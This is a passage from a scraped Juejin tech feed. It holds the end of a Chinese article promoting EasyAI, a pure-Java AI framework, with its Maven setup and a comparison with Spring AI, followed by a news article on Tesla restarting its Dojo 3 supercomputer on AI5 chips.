<p>它的地位就像 Spring 之于 JavaWeb，主打一个<strong>零依赖、开箱即用</strong> 。你只需要在 <code>pom.xml</code> 里加一个依赖，不需要安装 Python，不需要配置复杂的显卡驱动，直接就能跑起来 。</p>
<p><strong>它的核心优势如下</strong>：</p>
<ul>
<li><strong>零基础友好</strong>：不需要学 Python，不需要理解复杂的 Python 代码 。</li>
<li><strong>部署极简</strong>：Maven 一键引入，直接嵌入 Java 项目，不需要起额外的 Python 服务 。</li>
<li><strong>底层通透</strong>：它不仅提供封装好的模块，还开放了深度学习、机器学习、强化学习等底层算法工具 。</li>
</ul>
<p>使用它，只需要在 <code>pom.xml</code> 中添加依赖即可：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.dromara.easyai<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>easyAi<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.5.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><strong>就这么简单</strong>——不需要配置 CUDA，不需要安装 Python，不需要下载模型文件。</p>
<h2 data-id="heading-1">它能帮你搞定哪些实战场景？</h2>
<p>EasyAI 提供两个层次的能力：</p>
<p><strong>层次一：开箱即用的封装模块</strong></p>
<ul>
<li><strong>图像识别</strong>：包括图像目标检测（比如自动贩卖机识别商品）和像素级抠图 。</li>
<li><strong>人脸识别</strong>：支持人脸定位和身份识别，已有成熟的封装应用 。</li>
<li><strong>智能客服 (sayOrder)</strong> ：这套系统能识别用户意图、抓取关键词，还能进行多轮对话 。</li>
</ul>
<p><strong>层次二：底层算法工具</strong></p>
<ul>
<li><strong>深度学习</strong>：神经网络构建 。</li>
<li><strong>机器学习</strong>：分类、聚类、回归等算法 。</li>
<li><strong>强化学习与启发式学习</strong> 。</li>
<li><strong>矩阵运算</strong>：AI 运算的基础数学库 。</li>
</ul>
<h2 data-id="heading-2">已封装的功能模块详解</h2>
<h3 data-id="heading-3">图像目标检测</h3>
<p>可以在图像中定位并识别特定物体。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd946812e01e4020885611e7654929bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YUd1aWRl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769603504&amp;x-signature=OBtBjN6srhWV8Z66d7hgyUaCSlU%3D" alt="" loading="lazy"/></p>
<p><strong>应用场景举例</strong>：自动贩卖机视觉内核——识别用户选择的商品，自动结算。</p>
<h3 data-id="heading-4">图像语义分割（抠图）</h3>
<p>对图像进行像素级切割，把目标物体从背景中分离出来。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/867ba2d738404105be23197d1f012196~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YUd1aWRl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769603504&amp;x-signature=fdPp5AW4YDBbbOBFdee95hdFUR8%3D" alt="" loading="lazy"/></p>
<p><strong>效果</strong>：输入一张包含人物的照片，输出抠好的人物图像（背景透明）。</p>
<h3 data-id="heading-5">人脸识别</h3>
<p>基于 EasyAI 框架开发的人脸识别模块，支持：</p>
<ul>
<li>人脸定位（在图像中找到人脸位置）</li>
<li>人脸识别（判断是谁）</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/af5a82623f704695ad9e2a30c343ce85~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YUd1aWRl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769603504&amp;x-signature=dcUzSacCT2Si95itn%2B4iM%2FY3sIo%3D" alt="" loading="lazy"/></p>
<p><strong>相关项目</strong>：</p>
<ul>
<li>SeeFace（算法源码）：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fldp_dpsmax%2Fsee-face" target="_blank" title="https://gitee.com/ldp_dpsmax/see-face" ref="nofollow noopener noreferrer">gitee.com/ldp_dpsmax/…</a></li>
<li>EasyAI-Face（封装应用）：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Ffushoujiang%2Feasy-ai-face" target="_blank" title="https://gitee.com/fushoujiang/easy-ai-face" ref="nofollow noopener noreferrer">gitee.com/fushoujiang…</a></li>
</ul>
<h3 data-id="heading-6">智能客服系统（sayOrder）</h3>
<p><strong>sayOrder</strong> 是基于 EasyAI 封装的智能客服系统，功能包括：</p>

























<table><thead><tr><th>功能</th><th>说明</th></tr></thead><tbody><tr><td><strong>意图识别</strong></td><td>分析用户输入的语义，识别用户想做什么（用 typeID 区分意图）</td></tr><tr><td><strong>关键词抓取</strong></td><td>从用户语句中提取系统关心的信息（时间、地点、数量等）</td></tr><tr><td><strong>多轮对话</strong></td><td>信息不足时自动追问，引导用户补全信息</td></tr><tr><td><strong>自主问答</strong></td><td>回答用户的常见问题</td></tr></tbody></table>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a9d0f82194554bc2a6626e489bb057a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YUd1aWRl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769603504&amp;x-signature=aTIULseC9vdZI0x1YjCwVmDOVEw%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5e7239dd4dc44a6b86f5bc795b64863b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YUd1aWRl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769603504&amp;x-signature=IdZ2nLZBQqiPszFCeG3jZFHmKDo%3D" alt="" loading="lazy"/></p>
<p>我的<a href="https://link.juejin.cn?target=https%3A%2F%2Fjavaguide.cn%2Fabout-the-author%2Fzhishixingqiu-two-years.html" target="_blank" title="https://javaguide.cn/about-the-author/zhishixingqiu-two-years.html" ref="nofollow noopener noreferrer">星球</a>目前正在更新 <a href="https://link.juejin.cn?target=https%3A%2F%2Fjavaguide.cn%2Fzhuanlan%2Finterview-guide.html" target="_blank" title="https://javaguide.cn/zhuanlan/interview-guide.html" ref="nofollow noopener noreferrer">《SpringAI 智能面试平台+RAG 知识库》</a>配套实战项目教程，涉及到 Prompt Engineering、大模型集成、RAG（检索增强生成）、高性能对象存储与向量数据库。</p>
<p>内容非常全面，非常适合想要实战 AI 项目或者准备 AI 大模型应用开发岗位面试的朋友，来一张昨天刚写完的 <strong>3.4w 字+35 道题目的 RAG 面试题总结</strong>，大家感受一下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1f44bf77afb044e888af058cbf141574~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YUd1aWRl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769603504&amp;x-signature=d4g%2BmkbM9XDRfwub05rV6Q6WEzk%3D" alt="" loading="lazy"/></p>
<p><strong>工作流程示例</strong>：</p>
<ol>
<li>用户："我想咨询一下法律问题"</li>
<li>系统识别意图为"法律咨询"，但信息不足</li>
<li>系统追问："请问您想咨询哪方面的法律问题？"</li>
<li>用户补充信息，直到满足业务要求</li>
<li>系统生成完整的咨询订单</li>
</ol>
<p>项目地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fdromara%2FsayOrder" target="_blank" title="https://gitee.com/dromara/sayOrder" ref="nofollow noopener noreferrer">gitee.com/dromara/say…</a></p>
<h2 data-id="heading-7">EasyAI vs Python AI 框架</h2>













































<table><thead><tr><th>维度</th><th>EasyAI</th><th>Python 框架（TensorFlow/PyTorch）</th></tr></thead><tbody><tr><td>语言</td><td>Java</td><td>Python</td></tr><tr><td>依赖配置</td><td>零依赖，Maven 引入</td><td>复杂（CUDA、cuDNN、版本兼容等）</td></tr><tr><td>学习曲线</td><td>低（Java 开发者友好）</td><td>高（需要学 Python）</td></tr><tr><td>生态丰富度</td><td>相对有限</td><td>非常丰富</td></tr><tr><td>模型能力</td><td>小微模型、边缘场景</td><td>大模型、复杂场景</td></tr><tr><td>部署方式</td><td>直接嵌入 Java 项目</td><td>通常需要独立服务</td></tr><tr><td>GPU 支持</td><td>有限</td><td>完善</td></tr></tbody></table>
<h2 data-id="heading-8">EasyAI 适合什么场景？</h2>
<p><strong>EasyAI 适合的场景</strong>：</p>
<ul>
<li><strong>小微模型</strong>：不需要训练超大模型，业务场景明确</li>
<li><strong>Java 技术栈团队</strong>：团队主要用 Java，不想引入 Python 服务</li>
<li><strong>边缘计算/嵌入式</strong>：资源有限，需要轻量级方案</li>
<li><strong>快速原型验证</strong>：快速验证 AI 能不能解决业务问题</li>
<li><strong>学习 AI 原理</strong>：用熟悉的语言理解底层算法</li>
</ul>
<p><strong>什么场景不太适合？</strong></p>
<ul>
<li><strong>需要 GPT/BERT 这类大模型</strong>：EasyAI 的定位是"小微模型"</li>
<li><strong>追求 SOTA（最先进）效果</strong>：主流研究成果基本都在 Python 生态</li>
<li><strong>需要 GPU 加速训练大规模数据</strong>：EasyAI 的 GPU 支持有限</li>
</ul>
<h2 data-id="heading-9">EasyAI vs Spring AI</h2>
<p>很多 Java 同学会顺带问一句：<strong>EasyAI 跟 Spring AI 是不是竞争关系？</strong>
结论是：<strong>更多是互补，而不是替代</strong>。它们解决的问题不一样：</p>
<ul>
<li><strong>EasyAI</strong>：更像“Java 版的小微模型/算法框架”（偏<strong>训练、推理、算法实现</strong>），强调 <em>纯 Java、零依赖、开箱即用</em>，并提供图像识别、语义处理、智能客服等模块，以及矩阵运算、深度学习、机器学习等底层能力。</li>
<li><strong>Spring AI</strong>：更像“面向大模型应用的 Spring 生态集成层”（偏<strong>调用与编排</strong>），重点是把 LLM、Embedding、向量库、RAG、工具调用等能力，用 Spring 的方式接入你的业务系统。</li>
</ul>
<p>你可以把它们理解成两条路线：</p>
<ul>
<li><strong>路线 A：在 Java 里做/用小微模型（本地算法）</strong> → EasyAI</li>
<li><strong>路线 B：在 Java 里做大模型应用（调用外部/本地大模型服务）</strong> → Spring AI</li>
</ul>








































<table><thead><tr><th>维度</th><th>EasyAI</th><th>Spring AI</th></tr></thead><tbody><tr><td>核心定位</td><td><strong>纯 Java AI 算法框架</strong>（偏算法/模型能力）</td><td><strong>大模型应用框架</strong>（偏集成/编排）</td></tr><tr><td>主要面向</td><td>小微模型、传统 CV/NLP、轻量智能客服、算法学习与落地</td><td>LLM 应用、RAG 知识库、Agent/工具调用、提示词与流程编排</td></tr><tr><td>运行方式</td><td>代码内直接运行（强调零依赖、可嵌入 Java 项目）</td><td>通常对接模型服务/向量库等组件（强调生态适配与工程集成）</td></tr><tr><td>依赖生态</td><td>自己提供算法与模块（“框架即能力”）</td><td>依赖外部模型/向量库/推理服务（“框架管连接与流程”）</td></tr><tr><td>你最关心的价值</td><td><strong>不用 Python、无需额外环境</strong>也能做 AI 能力</td><td><strong>用 Spring 的方式</strong>快速做 LLM/RAG 应用，工程效率高</td></tr><tr><td>更适合</td><td>本地/边缘场景、资源受限、明确任务、小模型、教学实践</td><td>企业知识库问答、文档检索增强、对话助手、工具调用工作流</td></tr></tbody></table>
<p><strong>怎么选（或者怎么一起用）？</strong></p>
<ul>
<li>如果你想要的是：<strong>“不引入 Python、不折腾环境，直接在 Java 里跑出识别/分类/关键词抓取等能力”</strong> → 更偏 <strong>EasyAI</strong> 的优势。</li>
<li>如果你想要的是：<strong>“把大模型接进业务系统，做 RAG、对话、Agent，让模型能查库/调接口/读文档”</strong> → 更偏 <strong>Spring AI</strong> 的优势。</li>
<li>如果你两者都要：也完全可以组合——
用 <strong>Spring AI</strong> 做上层对话编排与 RAG，用 <strong>EasyAI</strong> 做某些本地算法能力（例如特定的 CV/NLP 组件）作为业务链路的一环。</li>
</ul>
<h2 data-id="heading-10">作者的话</h2>
<p>项目 README 里有一段很真实的话：</p>
<blockquote>
<p>"我爸跟我说，我写这些东西还不如给我找个餐馆，让我去端盘子，或者给我找个超市去干收银。所以大家帮帮我，点击右上角 Star 支持一下，我要证明他错了，谢谢帮助！"</p>
</blockquote>
<p>这种真诚和坚持，正是咱们技术人最动人的地方。目前 EasyAI 已经支持免费商用 。<strong>没有银弹，行动起来才是打破焦虑的唯一办法。</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI5芯片搞定，马斯克的纯自研超算Dojo 3又回来了]]></title>    <link>https://juejin.cn/post/7597650624636911616</link>    <guid>https://juejin.cn/post/7597650624636911616</guid>    <pubDate>2026-01-21T11:05:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597650624636911616" data-draft-id="7597452210646597632" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI5芯片搞定，马斯克的纯自研超算Dojo 3又回来了"/> <meta itemprop="keywords" content="人工智能,OpenAI"/> <meta itemprop="datePublished" content="2026-01-21T11:05:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="机器之心"/> <meta itemprop="url" content="https://juejin.cn/user/1873223543167902"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI5芯片搞定，马斯克的纯自研超算Dojo 3又回来了
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1873223543167902/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    机器之心
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T11:05:51.000Z" title="Wed Jan 21 2026 11:05:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>马斯克丢了个重磅炸弹：</p>
<p>「AI5 芯片设计进展顺利，特斯拉将重启 Dojo3 的工作。」</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/948c1bfbfc0244bab2d2a0d5a2480fac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769598351&amp;x-signature=yNWNYO9l0Yfw7vlp92VuJRSxt3c%3D" alt="图片" loading="lazy"/></p>
<p>简单两句话，包含了特别大的信息量。</p>
<p>Dojo 项目是在 2021 年特斯拉 AI Day 首次提出，定位是「面向机器学习训练的超级计算机」，目的是处理来自特斯拉汽车的视频录制和其他数据，并利用这些数据来训练公司全自动驾驶软件背后的「神经网络」。</p>
<p>在 2021 年的 CVPR 大会上，时任特斯拉人工智能高级总监的 Andrej Karpathy 曾表示，仅凭视觉技术，计算机必须以与人类相同的速度和敏锐度对新环境做出反应。然而，这需要利用强大的超级计算机，基于海量数据集对人工智能进行训练。而特斯拉就拥有这样一台超级计算机，即 Dojo。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f61f1f10f0f749e8bfa1951ed71335f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769598351&amp;x-signature=682NtzBG%2BdFkIWbZ5n99c%2FKCspU%3D" alt="图片" loading="lazy"/></p>
<p>2023 年 7 月，Dojo 正式投产。彼时，马斯克对 Dojo 项目充满了期待。</p>
<p>但不知大家还记不记得，去年 8 月，马斯克突然「全面叫停」Dojo 项目，暂时解散专门的 Dojo 团队，项目负责人 Peter Bannon 离职，约 20 名核心成员也跳槽成立新公司 DensityAI。</p>
<p>当时，特斯拉实际上在同时推进两套完全不同的芯片体系：用于车载系统和机器人的芯片，以及用于大规模 AI 训练的芯片。</p>
<p>事实证明，这样的双线推进效率并不高。马斯克必须做些取舍，于是决定暂停 Dojo 项目工作，来将全部资源投入到最具战略意义的 AI5 芯片上。 </p>
<p>彼时，外界听到这一消息，很多人都认为 Dojo 项目是一次失败，甚至认为马斯克已经放弃了该项目。但现在看来事实并非如此。</p>
<p>当时马斯克在 X 上发文解释：「对于特斯拉来说，分散资源并扩展两种截然不同的 AI 芯片设计是没有意义的。特斯拉的 AI5、AI6 及后续芯片在推理方面将非常出色，至少在训练方面也会相当不错。所有努力都集中在这一点上。」</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/da0c53ea2659486e85d26105144e4ce5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769598351&amp;x-signature=qqQl6a0T9sl74FhCH1mrHhcHOqc%3D" alt="图片" loading="lazy"/></p>
<p>AI5 是一颗高度关键的芯片，FSD、Cybercab、Optimus 等核心项目都要依赖它。在 2025 年下半年，马斯克非常明确地表示：AI5 还远未达到预期。如果 AI5 失败，特斯拉未来的自动驾驶和自主系统，很可能都会受到「致命影响」。</p>
<p>马斯克很坦诚地说过：「解决 AI5 对特斯拉来说是生死攸关的，这就是为什么我必须将两个团队都集中在这个芯片上，并且我个人在几个月的时间里每个周六都投入工作。」</p>
<p>特斯拉去年在 X 上表示，AI5 芯片可能比 AI4 芯片有高出 50 倍的提升，目标在 2027 年投入生产。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/088f8255e217471f9414981b08f2d91b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769598351&amp;x-signature=W64ZY7vQMz%2F29m1UoHh0aGlcjqA%3D" alt="图片" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5e646391c8944002bd2112285defd656~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769598351&amp;x-signature=wyvCqZebLCTqrGaiGEMtj5SFo%2B4%3D" alt="图片" loading="lazy"/></p>
<p>其实如果仔细回想，去年马斯克在公开解释 Dojo 项目被「叫停」的原因后，还谈到：「在一套超级计算机集群中，无论是用于推理还是训练，把大量 AI5 / AI6 芯片集成到同一块板卡上都是很合理的做法 —— 这样可以将网络布线的复杂度和成本直接降低好几个数量级。某种意义上，这大概就可以被称作 Dojo 3 了。」</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/86783212d5ad4f0b96a2c68d9023c47a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769598351&amp;x-signature=ywEtTo%2F2mogN14N%2FPdUWDEGRd8I%3D" alt="图片" loading="lazy"/></p>
<p>而如今，「Dojo3」项目意在将 512 颗 AI5 或 AI6 芯片密集集成于单块主板，形成超级计算机集群。原来，当时马斯克早已暗示了这一点，由此看来，Dojo 项目从来就没有真正停止，只不过是公司整体在路线优先权上的让步行为。现在，一切进展都在计划中，所以，「Dojo3」又回来了。</p>
<p>马斯克表示，「进展顺利」的 AI5 芯片的单颗 SoC 大致相当于 Hopper 级别，双颗则相当于 Blackwell 级别，但成本极低，功耗更低。</p>
<p>而 Dojo3 摒弃了前两代 Dojo 依赖自研 D1 芯片及晶圆级封装的复杂路径，核心在于架构重构与成本优化，从特斯拉战略规划来看，Dojo 3 采用了基于 AI5 和 AI6 芯片的统一架构，使单颗芯片能够同时处理训练和推理任务。</p>
<p>而这种设计能将网络布线复杂性与硬件成本降低数个数量级，同时保留大规模并行计算能力，这或许是特斯拉想要摆脱对英伟达 GPU 依赖，追求自研芯片垂直整合的战略。</p>
<p>与此同时，Dojo 3 提供的强大也将加速特斯拉 FSD 端到端神经网络模型迭代，同时为 Optimus 人形机器人的运动控制、环境感知模型训练提供算力支撑。</p>
<p>这对特斯拉而言绝对是一大利好，并且特斯拉将利用 AI5 芯片的潜能，不再将车载芯片与大规模 AI 算力芯片分开研究设计，而能够使用同一套芯片解决全部问题，从训练、推理到车辆和机器人，端到端自建完整算力体系。</p>
<p>这也说明了马斯克称这些芯片将成为「全球出货量最高的芯片」，AI5 或将被装进数百万辆汽车、机器人，并同时成为支撑背后训练系统的芯片。</p>
<p>据了解，目前特斯拉已经与三星电子签署了一项价值 165 亿美元的 AI6 芯片生产协议，这将为 Dojo 3 的规模化提供有力支撑。</p>
<p>当然了，马斯克毕竟是一个经常满嘴跑火车的人。</p>
<p>曾经马斯克表示 Dojo3 将是「基于太空的人工智能计算」，因为他和其他人认为相比地面上越建越大的数据中心，把算力搬到轨道上，反而可能是更优解。其想法是太空更容易获取太阳能，那里的低温可能会大大减少所需的电力等等。但他的说法完全属于推测，甚至有一些幻想色彩，专家们对此表示怀疑。</p>
<p>至于这条路究竟会把特斯拉带向哪里，能否达到马斯克的预期，Dojo 3 才刚刚走到起点，答案还得留给时间。</p>
<p>参考链接：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.theverge.com%2Fnews%2F864164%2Fback-to-the-dojo" target="_blank" title="https://www.theverge.com/news/864164/back-to-the-dojo" ref="nofollow noopener noreferrer">www.theverge.com/news/864164…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.engadget.com%2Fai%2Fmusk-claims-tesla-will-restart-work-on-its-dojo-supercomputer-173127863.html" target="_blank" title="https://www.engadget.com/ai/musk-claims-tesla-will-restart-work-on-its-dojo-supercomputer-173127863.html" ref="nofollow noopener noreferrer">www.engadget.com/ai/musk-cla…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fmubeitech%2Fstatus%2F2013304716931768596" target="_blank" title="https://x.com/mubeitech/status/2013304716931768596" ref="nofollow noopener noreferrer">x.com/mubeitech/s…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Felonmusk%2Fstatus%2F2013034224828215706%3Fs%3D20" target="_blank" title="https://x.com/elonmusk/status/2013034224828215706?s=20" ref="nofollow noopener noreferrer">x.com/elonmusk/st…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[拆解融合：测试开发，一个关于“更好”的悖论]]></title>    <link>https://juejin.cn/post/7597634458697121798</link>    <guid>https://juejin.cn/post/7597634458697121798</guid>    <pubDate>2026-01-21T11:15:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597634458697121798" data-draft-id="7597596202025451562" data-original-type="0" class="article" data-v-61fb5e44=""><!----> 